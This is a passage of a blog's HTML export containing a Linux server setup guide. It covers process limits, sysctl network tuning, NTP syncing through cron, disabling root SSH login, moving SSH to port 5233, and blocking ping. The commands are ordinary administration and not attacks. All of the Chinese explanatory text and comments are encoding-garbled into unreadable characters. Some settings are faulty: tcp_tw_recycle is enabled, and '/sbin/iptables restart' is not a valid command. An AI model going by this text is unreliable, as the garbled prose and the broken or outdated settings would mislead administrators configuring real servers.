id="3-æ›´æ”¹ç”¨æˆ·è¿›ç¨‹é™åˆ¶"><a href="#3-æ›´æ”¹ç”¨æˆ·è¿›ç¨‹é™åˆ¶" class="headerlink" title="3. æ›´æ”¹ç”¨æˆ·è¿›ç¨‹é™åˆ¶"></a><code>3</code>. æ›´æ”¹ç”¨æˆ·è¿›ç¨‹é™åˆ¶</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">vim /etc/security/limits.d/20-nproc.conf</div><div class="line"><span class="comment">#æ›´æ”¹ä¸€ä¸‹å†…å®¹</span></div><div class="line"></div><div class="line"></div><div class="line">*          soft    nproc     40960</div><div class="line">root       soft    nproc     unlimited <span class="comment">#æ— é™åˆ¶</span></div></pre></div></div></figure><blockquote><p>æ­¤æ­¥éª¤éœ€è¦é‡å¯æœºå™¨ç”Ÿæ•ˆï¼Œå¯ä»¥è®¾ç½®å®Œåå†é‡å¯</p></blockquote><h2 id="4-ç½‘ç»œçº¿ç¨‹ä¼˜åŒ–"><a href="#4-ç½‘ç»œçº¿ç¨‹ä¼˜åŒ–" class="headerlink" title="4. ç½‘ç»œçº¿ç¨‹ä¼˜åŒ–"></a><code>4</code>. ç½‘ç»œçº¿ç¨‹ä¼˜åŒ–</h2><p><code>vim /etc/sysctl.conf</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#åŠ å…¥å¦‚ä¸‹å†…å®¹</span></div><div class="line"><span class="comment"># Disable IPv6</span></div><div class="line">net.ipv6.conf.all.disable_ipv6 = 1</div><div class="line">net.ipv6.conf.default.disable_ipv6 = 1</div><div class="line"></div><div class="line"><span class="comment"># Determines how often to check for stale neighbor entries.</span></div><div class="line">net.ipv4.neigh.default.gc_stale_time=120</div><div class="line"></div><div class="line"><span class="comment"># Using arp_announce/arp_ignore to solve the ARP Problem</span></div><div class="line">net.ipv4.conf.default.arp_announce = 2</div><div class="line">net.ipv4.conf.all.arp_announce=2</div><div class="line">vm.swappiness = 0</div><div class="line">net.ipv4.tcp_max_tw_buckets = 5000</div><div class="line">net.ipv4.tcp_max_syn_backlog = 1024</div><div class="line">net.ipv4.tcp_synack_retries = 2</div><div class="line">net.ipv4.conf.lo.arp_announce=2</div><div class="line"></div><div class="line"></div><div class="line">net.ipv4.tcp_keepalive_time = 1800</div><div class="line">net.ipv4.tcp_keepalive_probes = 3</div><div class="line">net.ipv4.tcp_keepalive_intvl = 15</div><div class="line"></div><div class="line">net.ipv4.tcp_syncookies = 1</div><div class="line">net.ipv4.tcp_tw_reuse = 1</div><div class="line">net.ipv4.tcp_tw_recycle = 1</div><div class="line">net.ipv4.tcp_fin_timeout = 30</div></pre></div></div></figure><p>æ‰§è¡Œ<code>/sbin/sysctl -p</code>ä½¿è®¾ç½®ç”Ÿæ•ˆ</p><h2 id="5-æ—¶é—´æ ¡å¯¹"><a href="#5-æ—¶é—´æ ¡å¯¹" class="headerlink" title="5. æ—¶é—´æ ¡å¯¹"></a><code>5</code>. æ—¶é—´æ ¡å¯¹</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</div><div class="line"></div><div class="line">ntpdate us.pool.ntp.org</div><div class="line"></div><div class="line">crontab -e</div><div class="line"></div><div class="line">0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTP</div><div class="line"></div><div class="line">service crond restart</div></pre></div></div></figure><h2 id="6-å…³é—­rootç™»å½•å¹¶ä¿®æ”¹sshç«¯å£"><a href="#6-å…³é—­rootç™»å½•å¹¶ä¿®æ”¹sshç«¯å£" class="headerlink" title="6. å…³é—­rootç™»å½•å¹¶ä¿®æ”¹sshç«¯å£"></a><code>6</code>. å…³é—­rootç™»å½•å¹¶ä¿®æ”¹sshç«¯å£</h2><h3 id="1-æ·»åŠ æ™®é€šç”¨æˆ·"><a href="#1-æ·»åŠ æ™®é€šç”¨æˆ·" class="headerlink" title="1. æ·»åŠ æ™®é€šç”¨æˆ·"></a>1. æ·»åŠ æ™®é€šç”¨æˆ·</h3><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">groupadd power</div><div class="line">useradd -d /home/www/ -g power <span class="built_in">test</span></div><div class="line">passwd <span class="built_in">test</span></div></pre></div></div></figure><h3 id="2-iptableså¼€å¯5233ç«¯å£"><a href="#2-iptableså¼€å¯5233ç«¯å£" class="headerlink" title="2. iptableså¼€å¯5233ç«¯å£"></a>2. iptableså¼€å¯5233ç«¯å£</h3><blockquote><p><code>5233ä¸ºä¸‹é¢çš„æ›´æ”¹åsshç«¯å£, æ­¤æ­¥éª¤é¡»å…ˆäºä¸‹é¢æ­¥éª¤ï¼Œå¦åˆ™ä¼šé€ æˆsshè¿ä¸ä¸Šçš„</code></p></blockquote><p><code>vi /etc/sysconfig/iptables</code></p><p>æ·»åŠ </p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 5233 -j ACCEPT</div></pre></div></div></figure><p>æ‰§è¡Œ<br><code>/sbin/iptables restart</code></p><h3 id="3-ä¿®æ”¹sshdé…ç½®æ–‡ä»¶"><a href="#3-ä¿®æ”¹sshdé…ç½®æ–‡ä»¶" class="headerlink" title="3. ä¿®æ”¹sshdé…ç½®æ–‡ä»¶"></a>3. ä¿®æ”¹sshdé…ç½®æ–‡ä»¶</h3><pre><code>vim /etc/ssh/sshd_config</code></pre><p><strong>ç¦æ­¢rootç™»é™†</strong><br>æŠŠ<code>PermitRootLogin yes</code><br>æ”¹ä¸º<code>PermitRootLogin no</code></p><p><strong>ä¿®æ”¹é»˜è®¤ç«¯å£å·</strong><br>æŠŠ<code>Port 22</code><br>æ”¹ä¸º<code>Port 5233</code><br>æœ€åæ‰§è¡Œ<code>systemctl restart sshd.service</code></p><h2 id="7-ç¦æ­¢ping"><a href="#7-ç¦æ­¢ping" class="headerlink" title="7. ç¦æ­¢ping"></a><code>7</code>. ç¦æ­¢ping</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">ç¦æ­¢</div><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</div><div class="line">å¼€å¯</div><div class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</div><div class="line"></div><div class="line"><span class="comment">#æ°¸ä¹…ä¿å­˜</span></div><div class="line">vi /etc/rc.d/rc.local</div><div class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</div></pre></div></div></figure><h2 id="8-ç½‘ç»œå‘½ä»¤ifconfig-netstat"><a href="#8-ç½‘ç»œå‘½ä»¤ifconfig-netstat" class="headerlink" title="8. ç½‘ç»œå‘½ä»¤ifconfig,netstat"></a><code>8</code>. ç½‘ç»œå‘½ä»¤ifconfig,netstat</h2><p><code>yum -y install net-tools</code></p>]]></content>
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
